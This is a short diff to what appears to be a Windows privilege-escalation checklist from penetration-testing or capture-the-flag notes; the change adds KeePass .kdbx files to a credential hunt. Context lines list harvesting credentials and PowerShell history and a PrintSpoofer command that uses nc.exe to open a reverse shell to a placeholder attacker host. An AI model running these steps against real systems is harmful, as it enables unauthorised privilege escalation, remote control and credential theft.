@@ -2,7 +2,7 @@
 #### SOP for Windows 
 
 0. Run whoami /all 
-1. Look around for creds, log files, (and _run_) .ps1 , .sqlite or .db files 
+1. Look around for creds, log files, (and _run_) .ps1 , .sqlite , .db , .kdbx files 
 2. PowerShell history (C:\Users\user\appdata\roaming\microsoft\windows\powershell\psreadline) 
 3. Potato eg `PrintSpoofer.exe -c "C:\nc.exe {{LHOST}} 443 -e cmd.exe"` 
     - Try Print, god, juicy, rogue, sigma ; also check nc or nc64 
